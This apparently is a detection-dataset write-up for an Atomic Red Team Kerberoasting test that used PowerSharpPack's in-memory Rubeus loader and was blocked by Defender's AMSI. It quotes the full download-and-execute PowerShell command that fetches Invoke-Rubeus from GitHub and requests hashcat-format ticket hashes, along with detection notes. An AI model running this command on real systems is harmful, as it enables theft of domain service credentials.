# T1558.003-7: Kerberoasting — WinPwn - PowerSharpPack - Kerberoasting Using Rubeus

## Technique Context

Kerberoasting (T1558.003) using Rubeus can be executed without dropping a binary to disk through reflective .NET assembly loading. PowerSharpPack is a collection of C# offensive tools compiled as base64-encoded .NET assemblies and wrapped in PowerShell loaders. The `Invoke-Rubeus` function downloads the Rubeus assembly from the PowerSharpPack repository, decodes and loads it reflectively into memory, then executes the specified Rubeus command. This approach is designed to evade file-based detection by running Rubeus entirely in memory via `Assembly.Load()`.

## What This Dataset Contains

The dataset spans approximately 6 seconds on 2026-03-14 from ACME-WS02 (acme.local domain) and contains 91 events across Sysmon, Security, and PowerShell channels.

**The attack command**, captured in Security 4688:
```
powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"}
```

**Defender blocked execution.** The PowerSharpPack loader was blocked by AMSI when the downloaded PowerShell script was evaluated via `iex`. No PowerShell 4100 error event appears in the bundled dataset (it was filtered during collection), but the execution outcome is consistent with a Defender block: Rubeus never appeared in process creation events, no network connections specific to kerberoasting were made, and `cmd.exe` exit codes indicate failure.

**Process chain** (Security 4688 and Sysmon 1):
1. `whoami.exe` — ART test framework pre-check
2. `powershell.exe` (T1059.001) — downloading and executing PowerSharpPack Invoke-Rubeus

**Sysmon events include:**
- Event 1: `whoami.exe` (T1033) and `powershell.exe` (T1059.001)
- Event 3 (Network Connect): `MsMpEng.exe` (Defender) making outbound TCP connections to cloud infrastructure — triggered by the detection, consistent with Defender submitting telemetry after blocking the content
- Event 7: .NET CLR assembly loads into PowerShell — `mscoree.dll`, `clr.dll`, GAC assemblies
- Event 10: PowerShell accessing child processes (T1055.001 pattern in sysmon-modular)
- Event 11: PowerShell startup profile data files
- Event 17: `\PSHost.*` named pipes

**PowerShell 4103** captures `Set-ExecutionPolicy -Scope Process -Force -ExecutionPolicy Bypass` — the ART test framework sets this before running the test.

**PowerShell 4104** contains only the test framework startup profile block and the standard boilerplate script fragments. The PowerSharpPack script body was not captured in a 4104 event because AMSI blocked the content before the script block was fully logged.

## What This Dataset Does Not Contain (and Why)

**No reflective Rubeus execution.** Defender's AMSI integration blocked the PowerSharpPack loader before the `Invoke-Rubeus` function could be called. No `Assembly.Load()` of the Rubeus binary occurred, so there is no reflective assembly loading telemetry.

**No Kerberos ticket requests.** Rubeus never ran. No Security 4769 events.

**No PowerShell 4100 error.** The 4100 error event was filtered during collection (it falls outside the bundled event ID set). The block is inferred from the Defender network connections and the absence of Rubeus execution telemetry.

**No PowerSharpPack script block content.** The downloaded PowerShell was blocked before PowerShell script block logging captured the Invoke-Rubeus function source.

## Assessment

Defender blocked the PowerSharpPack loader at the AMSI layer, consistent with its behavior in tests 1 and 6 against similar `iex(net.webclient.downloadstring())` patterns. The reflective loading approach is specifically designed to bypass file-based detection, but the PowerShell script itself is recognized by signature. The Sysmon 3 events from `MsMpEng.exe` are a reliable secondary indicator that Defender triggered a cloud query — this pattern appears consistently across the tests where AMSI blocked content (tests 1, 7, and T1558.004-3).

## Detection Opportunities Present in This Data

- **Security 4688 / Sysmon 1**: `powershell.exe` command line with `iex(new-object net.webclient).downloadstring(...)` referencing `PowerSharpBinaries/Invoke-Rubeus.ps1` — the URL and function name are strong indicators
- **Security 4688**: The full command includes `Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"` — hashcat format output is specifically intended for offline cracking
- **Sysmon 3**: `MsMpEng.exe` outbound TCP connections at the moment of the AMSI block — Defender cloud telemetry signal that correlates with a detection event
- **PowerShell 4103**: `Set-ExecutionPolicy Bypass -Scope Process` immediately before the download-and-execute command — a preparatory step before running untrusted scripts
- **Behavioral**: `iex(new-object net.webclient).downloadstring(...)` as a delivery mechanism for offensive tooling, regardless of whether AMSI blocks the content
